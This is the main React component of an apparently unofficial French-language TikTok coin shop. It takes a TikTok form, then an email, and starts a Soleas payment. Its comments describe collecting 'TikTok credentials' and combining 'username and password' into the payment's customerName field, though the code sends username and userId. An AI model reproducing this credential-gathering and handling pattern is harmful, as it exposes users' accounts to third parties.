import React, { useState } from 'react';
import { Coins } from 'lucide-react';
import { CoinPackage as CoinPackageComponent } from './components/CoinPackage';
import { CustomPackage } from './components/CustomPackage';
import { PurchaseHistory } from './components/PurchaseHistory';
import { TikTokFormModal } from './components/TikTokForm';
import { EmailFormModal } from './components/EmailForm';
import { coinPackages } from './data/coinPackages';
import { Purchase, User, CoinPackage, TikTokForm } from './types';
import { initiateSoleasPayment } from './utils/payment';

function App() {
  const [user, setUser] = useState<User>({
    balance: 0,
    purchaseHistory: [],
  });

  const [selectedPackage, setSelectedPackage] = useState<CoinPackage | null>(null);
  const [tiktokData, setTiktokData] = useState<TikTokForm | null>(null);
  const [showEmailForm, setShowEmailForm] = useState(false);

  const handlePackageSelect = (pkg: CoinPackage) => {
    setSelectedPackage(pkg);
  };

  const handleFormCancel = () => {
    setSelectedPackage(null);
    setTiktokData(null);
    setShowEmailForm(false);
  };

  const handleEmailFormCancel = () => {
    setShowEmailForm(false);
  };

  const [paymentError, setPaymentError] = useState<string | null>(null);

  // First step: collect TikTok credentials
  const handleFormSubmit = (data: TikTokForm) => {
    setTiktokData(data);
    setShowEmailForm(true);
  };

  // Second step: collect email and process payment
  const handleEmailSubmit = (email: string) => {
    if (!selectedPackage || !tiktokData) return;
    
    // Clear any previous errors
    setPaymentError(null);

    // Generate orderId in the format TKT-XXXXX where X are random alphanumeric characters
    const generateRandomAlphanumeric = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };
    
    const orderId = `TKT-${generateRandomAlphanumeric(5)}`;
    
    // Create a shorter description (max 50 chars)
    const description = `Achat ${selectedPackage.amount} pièces TikTok`;

    // Combine username and password in the customerName field
    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.userId}`;
    
    initiateSoleasPayment({
      amount: selectedPackage.price,
      currency: 'XAF',
      description,
      orderId,
      customerName: customerNameWithCredentials,
      customerEmail: email, // Using the email provided by the user for payment confirmation
      successUrl: `${window.location.origin}/payment/success?orderId=${orderId}`,
      failureUrl: `${window.location.origin}/payment/cancel?orderId=${orderId}`,
    })
    .then(() => {
      console.log('Payment initiated successfully');
      // Reset forms after successful payment initiation
      setSelectedPackage(null);
      setTiktokData(null);
      setShowEmailForm(false);
    })
    .catch((error) => {
      console.error('Payment error:', error);
      setPaymentError(error);
    });
  };

  const handlePurchaseSuccess = (pkg: CoinPackage) => {
    const purchase: Purchase = {
      id: crypto.randomUUID(),
      packageId: pkg.id,
      amount: pkg.amount + (pkg.bonus || 0),
      price: pkg.price,
      date: new Date(),
    };

    setUser(prev => ({
      balance: prev.balance + purchase.amount,
      purchaseHistory: [purchase, ...prev.purchaseHistory],
    }));
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <header className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <h1 className="text-3xl font-bold text-gray-900 flex items-center gap-2">
              <Coins className="w-8 h-8 text-pink-500" />
              TikTok Coins by PayOol™
            </h1>
            <div className="bg-pink-50 px-4 py-2 rounded-lg">
              <span className="text-pink-600 font-medium">Solde: {user.balance} pièces</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {coinPackages.map((pkg) => (
            <CoinPackageComponent
              key={pkg.id}
              package={pkg}
              onSelect={handlePackageSelect}
            />
          ))}
          <CustomPackage onSelect={handlePackageSelect} />
        </div>

        <div className="mt-12">
          <h2 className="text-2xl font-bold mb-6">Historique des achats</h2>
          <PurchaseHistory purchases={user.purchaseHistory} />
        </div>

        {selectedPackage && !showEmailForm && (
          <TikTokFormModal
            onSubmit={handleFormSubmit}
            onCancel={handleFormCancel}
          />
        )}
        
        {showEmailForm && (
          <EmailFormModal
            onSubmit={handleEmailSubmit}
            onCancel={handleEmailFormCancel}
          />
        )}
        
        {/* Display payment errors */}
        {paymentError && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-xl p-6 w-full max-w-md">
              <h2 className="text-xl font-bold mb-4 text-red-600">Erreur de paiement</h2>
              <p className="mb-4">{paymentError}</p>
              <button 
                onClick={() => setPaymentError(null)}
                className="w-full px-4 py-2 bg-pink-500 text-white rounded-lg hover:bg-pink-600"
              >
                Fermer
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

export default App;